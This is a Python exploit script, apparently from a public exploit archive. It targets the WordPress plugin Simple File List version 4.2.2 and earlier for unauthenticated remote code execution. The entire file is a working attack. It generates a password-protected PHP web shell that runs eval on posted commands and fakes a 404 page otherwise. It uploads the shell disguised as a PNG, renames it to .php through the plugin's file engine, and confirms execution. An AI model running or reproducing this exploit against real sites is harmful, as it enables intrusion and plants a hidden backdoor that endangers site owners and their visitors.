# Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Remote Code Execution
# Date: 2020-04-19
# Exploit Author: coiffeur
# Vendor Homepage: https://simplefilelist.com/
# Software Link: https://wordpress.org/plugins/simple-file-list/
# Version: Wordpress Simple File List <= v4.2.2

import requests
import random
import hashlib
import sys
import os
import urllib3
urllib3.disable_warnings()

dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'


def usage():
    banner = """
NAME: Wordpress v5.4 Simple File List v4.2.2, pre-auth RCE
SYNOPSIS: python wp_simple_file_list_4.2.2.py <URL>
AUTHOR: coiffeur
    """
    print(banner)


def generate():
    filename = f'{random.randint(0, 10000)}.png'
    password = hashlib.md5(bytearray(random.getrandbits(8)
                                     for _ in range(20))).hexdigest()
    with open(f'{filename}', 'wb') as f:
        payload = '<?php if($_POST["password"]=="' + password + \
            '"){eval($_POST["cmd"]);}else{echo "<title>404 Not Found</title><h1>Not Found</h1>";}?>'
        f.write(payload.encode())
    print(f'[ ] File {filename} generated with password: {password}')
    return filename, password


def upload(url, filename):
    files = {'file': (filename, open(filename, 'rb'), 'image/png')}
    datas = {'eeSFL_ID': 1, 'eeSFL_FileUploadDir': dir_path,
             'eeSFL_Timestamp': 1587258885, 'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'}
    r = requests.post(url=f'{url}{upload_path}',
                      data=datas, files=files, verify=False)
    r = requests.get(url=f'{url}{dir_path}{filename}', verify=False)
    if r.status_code == 200:
        print(f'[ ] File uploaded at {url}{dir_path}{filename}')
        os.remove(filename)
    else:
        print(f'[*] Failed to upload {filename}')
        exit(-1)
    return filename


def move(url, filename):
    new_filename = f'{filename.split(".")[0]}.php'
    headers = {'Referer': f'{url}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
               'X-Requested-With': 'XMLHttpRequest'}
    datas = {'eeSFL_ID': 1, 'eeFileOld': filename,
             'eeListFolder': '/', 'eeFileAction': f'Rename|{new_filename}'}
    r = requests.post(url=f'{url}{move_path}',
                      data=datas, headers=headers, verify=False)
    if r.status_code == 200:
        print(f'[ ] File moved to {url}{dir_path}{new_filename}')
    else:
        print(f'[*] Failed to move {filename}')
        exit(-1)
    return new_filename


def main(url):
    file_to_upload, password = generate()
    uploaded_file = upload(url, file_to_upload)
    moved_file = move(url, uploaded_file)
    if moved_file:
        print(f'[+] Exploit seem to work.\n[*] Confirmning ...')

    datas = {'password': password, 'cmd': 'phpinfo();'}
    r = requests.post(url=f'{url}{dir_path}{moved_file}',
                      data=datas, verify=False)
    if r.status_code == 200 and r.text.find('php') != -1:
        print('[+] Exploit work !')
        print(f'\tURL: {url}{dir_path}{moved_file}')
        print(f'\tPassword: {password}')


if __name__ == "__main__":
    if (len(sys.argv) < 2):
        usage()
        exit(-1)

    main(sys.argv[1])